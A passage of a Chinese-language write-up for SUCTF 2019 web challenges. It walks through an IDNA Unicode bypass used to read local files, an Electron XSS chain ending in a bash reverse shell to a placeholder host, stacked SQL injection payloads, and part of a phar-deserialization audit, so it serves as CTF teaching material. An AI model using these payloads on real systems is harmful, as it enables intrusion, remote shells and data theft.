+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line"></span><br><span class="line">k = []</span><br><span class="line">for i in range(94):</span><br><span class="line">	k.append([])</span><br><span class="line">for x in range(65536):</span><br><span class="line">	try:</span><br><span class="line">		a = chr(x).encode(&apos;idna&apos;).decode(&apos;utf-8&apos;)</span><br><span class="line">		if len(a) == 1:</span><br><span class="line">			if ord(a)&gt;32 and ord(a)&lt;127:</span><br><span class="line">				k[ord(a)-33].append(str(hex(x)))</span><br><span class="line">	except:</span><br><span class="line">		pass</span><br><span class="line">for i in range(94):</span><br><span class="line">	print(str(chr(i+33))+&quot;:&quot;),</span><br><span class="line">	print(k[i])</span><br></pre></td></tr></table></figure>
+<p>跑一下可以跑出一堆，这里用0x17f代替s</p>
+<p>然后尝试一下<code>http://ſuctf.cc</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/55dd157004aeec1fa93378df0604f958.png" alt=""></p>
+<p>成功回到首页，于是file协议读一波<code>/etc/passwd</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/3c985041496cf067040b98b8f0e67dfd.png" alt=""></p>
+<p>没啥东西</p>
+<p>这时想到题目有nginx，同时源码有提示了一次</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/9f209f063ed315a544d9724ae1835058.png" alt=""></p>
+<p>于是<code>/usr/local/nginx/conf/nginx.conf</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/f0e78ef64cd1b26a76e3b54b9ccd09f3.png" alt=""></p>
+<p>然后最后读flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/df2239790651ed52741961407084995b.png" alt=""></p>
+<p><code>?url=file://ſuctf.cc/../../../../../../../../../../usr/fffffflag</code></p>
+<p>看有大佬只去读了<code>/etc/nginx/conf.d/nginx.conf</code>没读<code>/usr/local/nginx/conf/nginx.conf</code>丢了一血真的亏，没怎么用nginx记一下这两个配置位置先</p>
+<h2 id="iCloudMusic"><a href="#iCloudMusic" class="headerlink" title="iCloudMusic"></a>iCloudMusic</h2><p>这题buu上没有，bot日常起不来,本地起的Electron页面也不是很好用，脑补做题法x</p>
+<p>下载下来的压缩包中有个resources，进去后有个asar文件，可以用asar命令解包获得源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install asar 安装一下asar</span><br><span class="line">asar extract app.asar app 解包asar</span><br></pre></td></tr></table></figure>
+<p>读源码直接去看到<code>main.js</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let filter=(input)=&gt;&#123;</span><br><span class="line">  input=input.replace(/=|\&apos;|\&quot;|\(|\)/g,&apos;&apos;);</span><br><span class="line">  return input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>36行处对input的输入全都进行了过滤</p>
+<p>然后找到搜索框对应的交互</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">search.onclick=function()&#123;</span><br><span class="line">  console.log(&quot;searching&quot;);</span><br><span class="line">  request.get(</span><br><span class="line">    &quot;http://cloudmusic.imagemlt.xyz:3000/playlist/detail?id=&quot;+encodeURIComponent(document.getElementById(&quot;input&quot;).value)+&quot;&amp;time=&quot;+Date.now(),</span><br><span class="line"></span><br><span class="line">      (error,responce,body)=&gt;&#123;</span><br><span class="line">      if (!error &amp;&amp; responce.statusCode==200)&#123;</span><br><span class="line">        let res=JSON.parse(body);</span><br><span class="line">        console.log(res);</span><br><span class="line">        if(res.code==200)&#123;</span><br><span class="line">          let currentId=remote.getCurrentWebContents().id;</span><br><span class="line"></span><br><span class="line">            searchRes.style.minHeight=&quot;400px&quot;;</span><br><span class="line">            let js_to_run = `</span><br><span class="line">            window.music_info=&#123;header:&apos;$&#123;res.playlist.coverImgUrl&#125;&apos;,title:&apos;$&#123;res.playlist.name.substr(0,10).replace(/\n/g,&apos;&apos;)&#125;&apos;,desc:&apos;$&#123;res.playlist.description.substr(0,50).replace(/\n/g,&apos;&apos;)&#125;&apos;&#125;;</span><br><span class="line">            console.log(music_info);</span><br><span class="line">            window.pid=$&#123;res.playlist.id&#125;;</span><br><span class="line">            window.fid=$&#123;currentId&#125;;</span><br><span class="line">            avator.src=music_info[&apos;header&apos;];</span><br><span class="line">            avName.innerText=music_info[&apos;title&apos;];</span><br><span class="line">            avDesp.innerText=music_info[&apos;desc&apos;];</span><br><span class="line">            avator.onclick=play;</span><br><span class="line">            refreshCode();</span><br><span class="line">          `</span><br><span class="line">          view.style.visibility=&quot;visible&quot;</span><br><span class="line">          view.executeJavaScript(js_to_run)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else&#123;</span><br><span class="line">        console.log(responce.statusCode);</span><br><span class="line">        if(responce.statusCode==404)&#123;</span><br><span class="line">          document.getElementById(&quot;searchRes&quot;).innerHTML=&quot;&lt;p style=&apos;width:90%;text-align:center;color:white&apos;&gt;没有找到您的歌单&lt;/p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>进行了搜索，然后将结果放入<code>js_to_run</code>中，再用<code>executeJavaScript()</code>执行<code>js_to_run</code></p>
+<p>再去看<code>list.html</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;container&quot;&gt;</span><br><span class="line">    &lt;img id=&quot;avator&quot;/&gt;</span><br><span class="line">    &lt;span id=&quot;avName&quot;&gt;&lt;/span&gt;</span><br><span class="line">    &lt;span id=&quot;avDesp&quot;&gt;&lt;/span&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;span id=&quot;code&quot;&gt;&lt;/span&gt;</span><br><span class="line">        &lt;input id=&quot;captcha&quot;/&gt;</span><br><span class="line">        &lt;a id=&quot;share&quot;&gt;好听的话，就分享给管理员吧！&lt;/a&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p>有一个分享给管理员的功能，八成是XSS了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    Object.freeze(document.location)</span><br><span class="line">    share.addEventListener(&apos;click&apos;,(e)=&gt;&#123;</span><br><span class="line">        if(window.pid!=undefined) &#123;</span><br><span class="line">            request.post(&#123;</span><br><span class="line">                url:&quot;http://127.0.0.1:5000/&quot;,</span><br><span class="line">                form:&#123;</span><br><span class="line">                    music:JSON.stringify(music_info),</span><br><span class="line">                    id:window.pid,</span><br><span class="line">                    code:captcha.value</span><br><span class="line">                &#125;,</span><br><span class="line">                headers:&#123;</span><br><span class="line">                    Cookie:window.session,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, (error, response, body) =&gt; &#123;</span><br><span class="line">                if (!error &amp;&amp; response.statusCode == 200) &#123;</span><br><span class="line">                    console.log(body);</span><br><span class="line">                    res=JSON.parse(body);</span><br><span class="line">                    if(res.success)&#123;</span><br><span class="line">                        share.innerText=&quot;已分享&quot;;</span><br><span class="line">                        setTimeout(()=&gt;&#123;</span><br><span class="line">                            share.innerText=&quot;好听的话，就分享给管理员吧！&quot;;</span><br><span class="line">                        &#125;,1000)</span><br><span class="line">                    &#125;</span><br><span class="line">                    else&#123;</span><br><span class="line">                        share.innerText=&quot;分享失败，验证码错误&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                    refreshCode();</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                    console.log(error,response)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这里将music_info进行json序列化后发送，不过不太懂这里的music_info是怎么获得的</p>
+<p><code>id=xxx&amp;music={&quot;header&quot;:&quot;xxxx&quot;,&quot;title&quot;:&quot;xxxx&quot;,&quot;desc&quot;:&quot;xxx&quot;} &amp;code=xxx</code></p>
+<p>通过测试可以知道发送的参数是这样的，结合刚刚搜索框处的代码，猜测是通过id去获取music读取其中内容。因为这里的music不是通过input提交，于是可以不用理那个过滤。同时<code>js_to_run</code>中，header没有做任何限制，可以利用header发动攻击</p>
+<p>像这样就能把弹回数据</p>
+<p><code>{&quot;header&quot;:&quot;&#39;};var xml = new XMLHttpRequest;xml.open(&#39;POST&#39;, &#39;ip:port&#39;, !0),xml.setRequestHeader(&#39;Content-type&#39;, &#39;application/x-www-form-urlencoded&#39;),xml.onreadystatechange = function() { 4 == xml.readyState &amp;&amp; xml.status},xml.send(&#39;test&#39;);//&quot;,&quot;title&quot;:&quot;xxxx&quot;,&quot;desc&quot;:&quot;xxx&quot;}</code></p>
+<p>接入<code>js_to_run</code>后就第一句就成了</p>
+<p><code>window.music_info={header:&#39;&#39;};var xml = new XMLHttpRequest;xml.open(&#39;POST&#39;, &#39;ip:port&#39;, !0),xml.setRequestHeader(&#39;Content-type&#39;, &#39;application/x-www-form-urlencoded&#39;),xml.onreadystatechange = function() { 4 == xml.readyState &amp;&amp; xml.status},xml.send(&#39;test&#39;);//&#39;,title:&#39;xxxx&#39;,desc:&#39;xxx&#39;};</code></p>
+<p>然后<code>executeJavaScript()</code>执行这一句就成功发出请求</p>
+<p>不过只是弹数据不够，还需要RCE。在electron中，当<code>nodeIntegration</code>为<code>true</code>时，可以使用nodejs模块。也就是说当<code>nodeIntegration</code>设置允许时，可以通过nodejs进行RCE<br>但是，虽然这题<code>nodeIntegration</code>是允许的，但view所生成的webview窗口是与原页面分开的，也就是一个沙盒，默认<code>nodeIntegration</code>为关闭的，无法使用nodejs</p>
+<p>不过题目在这里给了个<code>hint:contextisolation</code><br>于是去查一下，可以查到<br><a href="https://www.bookstack.cn/read/electronjs-v7.0-zh/tutorial-security.md" target="_blank" rel="noopener">Electron v7.1 官方中文文档:安全 3)为远程内容开启上下文隔离</a><br>也就是<code>contextIsolation</code>为<code>false</code>时，上下文不再隔离，预加载的脚本中配置就能在主上下文中修改，同时有效于预加载了该脚本的窗口中</p>
+<p><code>&lt;webview src=&quot;http://127.0.0.1:5000/list.html&quot; preload=&quot;pr.js&quot; id=&quot;view&quot;&gt;&lt;/webview&gt;</code></p>
+<p>这里预加载了<code>pr.js</code>，不过没配置<code>contextisolation</code>，应该默认是关的吧</p>
+<p>利用这个配置问题，我们可以重写函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.apply2=Function.prototype.apply;</span><br><span class="line">Function.prototype.apply=function(...args)&#123;</span><br><span class="line">    for(var i in args)</span><br><span class="line">        if(args[i])</span><br><span class="line">        console.log(args[i].toString());</span><br><span class="line">    return this.apply2(...args);</span><br><span class="line">&#125;</span><br><span class="line">request.get(&apos;http://www.baidu.com/&apos;,null)</span><br></pre></td></tr></table></figure>
+<p>先像这样重写一波所有函数，输出传入的所有参数。通过暴力fuzz，去寻找process类。经过尝试使用<code>request.get()</code>函数时，第一个参数为process类<br>于是再次重写反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.apply2=Function.prototype.apply;</span><br><span class="line">Function.prototype.apply=function(...args)&#123;</span><br><span class="line">    if(args[0]!=null &amp;&amp; args[0]!=undefined &amp;&amp; args[0].env!=undefined)&#123;</span><br><span class="line">        Function.prototype.apply=Function.prototype.apply2;</span><br><span class="line">        args[0].mainModule.require(&apos;child_process&apos;).exec(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/XXXXXX/8080 0&gt;&amp;1&quot;&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	return this.apply2(...args)</span><br><span class="line">&#125;</span><br><span class="line">request.get(&apos;http://www.baidu.com/&apos;,null)</span><br></pre></td></tr></table></figure>
+<p>这里除了暴力fuzz还能通过白盒审计去找寻process</p>
+<p>process下有<code>nextTrick()</code>这个函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ƒ (...args) &#123;</span><br><span class="line">	process.activateUvLoop();</span><br><span class="line">	return func.apply(this, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用<code>func.apply()</code>时传入了自身</p>
+<p>而http库下，处理socket请求的关键函数调用了<code>netxTrick()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClientRequest.prototype.onSocket = function onSocket(socket) &#123;</span><br><span class="line">	process.nextTick(onSocketNT, this, socket);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>然后request库中请求也都是使用http库，同时自身也多次调用了<code>netxTrick()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var defer = typeof setImmediate === &apos;undefined&apos;</span><br><span class="line">	? process.nextTick</span><br><span class="line">	: setImmediate</span><br></pre></td></tr></table></figure>
+<p>不过我还是觉得比起白盒爆破应该更快Orz,毕竟<code>pr.js</code>中就引用了request库，会从这里开始找</p>
+<p>不过做这题发现Electron这个玩意还挺好玩的样子，做出来的桌面页面有点漂亮，寒假整整玩看</p>
+<h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>这题其实看不太懂大佬们怎么猜出sql语句的。这题是堆叠注入，fuzz一下可以发现过滤了<code>union，from，like，where</code>之类的，直接查不太可能了</p>
+<p>这里测试时会发现只有输入非零数字时才会回显，但靠这个真的猜不出语句呀Orz。后台的sql语句应该是<br><code>select $_GET[&#39;query&#39;] || flag from flag</code><br>看到后想到可以输入true和false去测试，实际也成功了，不过不知道语句前实在想不到</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/8def7ea54073e25b98df83dd85065f0b.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/78beabbd61a75e8c857bcf796b382c94.png" alt=""></p>
+<p>得到了语句后，就想到直接去查那个列不就好了，尝试了一下<code>flag,1</code>，不过flag被过滤了。那就直接读全部吧，于是<code>*,1</code>得到flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/60571effa1f36864dc1ef866e2d01789.png" alt=""></p>
+<p>不过其实这题出题人想考的是||可以通过mysql的配置修改为两个字符串连接<br>可以看mysql的手册<a href="https://mariadb.com/kb/en/library/sql-mode/" target="_blank" rel="noopener">SQL_MODE</a><br>可以通过将mysql的模式设为<code>PIPES_AS_CONCAT</code>，这样||就会被认为是连接符而不是或运算。Mysql可以用<code>set sql_mode=</code>语句设置模式，于是构造一下payload<br><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/SUCTF2019_web_wp/5e476461b515fcd71e29350c83f0209d.png" alt=""></p>
+<p>同样可以拿到flag</p>
+<h2 id="Uploads-labs-2"><a href="#Uploads-labs-2" class="headerlink" title="Uploads labs 2"></a>Uploads labs 2</h2><p>比赛时给了源码，是道审计题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    // 允许上传的图片后缀</span><br><span class="line">    $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</span><br><span class="line">    $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $file_name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    $temp = explode(&quot;.&quot;, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))</span><br><span class="line">        &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800)   // 小于 200 kb</span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = new Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123;</span><br><span class="line">            echo &quot;错误：: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . &quot;/&quot; . md5($file_name) . &quot;.&quot; . $extension);</span><br><span class="line">            echo &quot;文件存储在: &quot; . $userdir . &quot;/&quot; . md5($file_name) . &quot;.&quot; . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;非法的文件格式&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function check()&#123;</span><br><span class="line">       $data = file_get_contents($this-&gt;file_name);</span><br><span class="line">       if (mb_strpos($data, &quot;&lt;?&quot;) !== FALSE) &#123;</span><br><span class="line">           die(&quot;&amp;lt;? in contents!&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>这次的上传没有检查文件头，只是检查了后缀和内容，猜测是phar的反序列化。一开始想着是不是<code>file_get_contents</code>处触发，不过想想<code>file_name</code>难以控制应该不是这</p>
+<p>然后看<code>func.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&quot;submit&quot;]) &amp;&amp; isset($_POST[&quot;url&quot;])) &#123;</span><br><span class="line">    if(preg_match(&apos;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&apos;,$_POST[&apos;url&apos;]))&#123;</span><br><span class="line">        die(&quot;Go away!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $file_path = $_POST[&apos;url&apos;];</span><br><span class="line">        $file = new File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        echo &quot;&lt;p&gt;Your file type is &apos;$file&apos; &lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里过滤了一堆协议，不允许以这些协议开头，这就很难搞。不过没有过滤php，于是就有大佬fuzz出<code>php://filter/resource=phar://</code>，tql又学到一个新操作</p>
+<p>然后用到了file类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class File&#123;</span><br><span class="line">    public $file_name;</span><br><span class="line">    public $type;</span><br><span class="line">    public $func = &quot;Check&quot;;</span><br><span class="line">    function __construct($file_name)&#123;</span><br><span class="line">        $this-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $class = new ReflectionClass($this-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs($this-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getMIME()&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        $this-&gt;type = finfo_file($finfo, $this-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        return $this-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>File类的<code>__wakeup()</code>中使用了反射类，那我们可以利用这里实例化其他类。然后在<code>getMIME()</code>中使用了<code>finfo_file()</code>，那就是利用这里反序列化phar，继而反序列化File调用<code>__wakeup()</code>。接下来要做什么继续看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">class Ad&#123;</span><br><span class="line"></span><br><span class="line">    public $cmd;</span><br><span class="line">    public $clazz;</span><br><span class="line">    public $func1;</span><br><span class="line">    public $func2;</span><br><span class="line">    public $func3;</span><br><span class="line">    public $instance;</span><br><span class="line">    public $arg1;</span><br><span class="line">    public $arg2;</span><br><span class="line">    public $arg3;</span><br><span class="line"></span><br><span class="line">    function __construct($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)&#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        $this-&gt;clazz = $clazz;</span><br><span class="line">        $this-&gt;func1 = $func1;</span><br><span class="line">        $this-&gt;func2 = $func2;</span><br><span class="line">        $this-&gt;func3 = $func3;</span><br><span class="line">        $this-&gt;arg1 = $arg1;</span><br><span class="line">        $this-&gt;arg2 = $arg2;</span><br><span class="line">        $this-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check()&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = new ReflectionClass($this-&gt;clazz);</span><br><span class="line">        $this-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>admin.php</code>中有个Ad类，<code>__destruct()</code>中使用了<code>system()</code>，那就是要利用这里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos;)&#123;</span><br><span class="line">    if(isset($_POST[&apos;admin&apos;]))&#123;</span><br><span class="line">        $cmd = $_POST[&apos;cmd&apos;];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[&apos;clazz&apos;];</span><br><span class="line">        $func1 = $_POST[&apos;func1&apos;];</span><br><span class="line">        $func2 = $_POST[&apos;func2&apos;];</span><br><span class="line">        $func3 = $_POST[&apos;func3&apos;];</span><br><span class="line">        $arg1 = $_POST[&apos;arg1&apos;];</span><br><span class="line">        $arg2 = $_POST[&apos;arg2&apos;];</span><br><span class="line">        $arg2 = $_POST[&apos;arg3&apos;];</span><br><span class="line">        $admin = new Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续看下面，判断是否来自127.0.0.1，然后实例化Ad类调用<code>check()</code>。那就是要用soap类去访问这里</p>
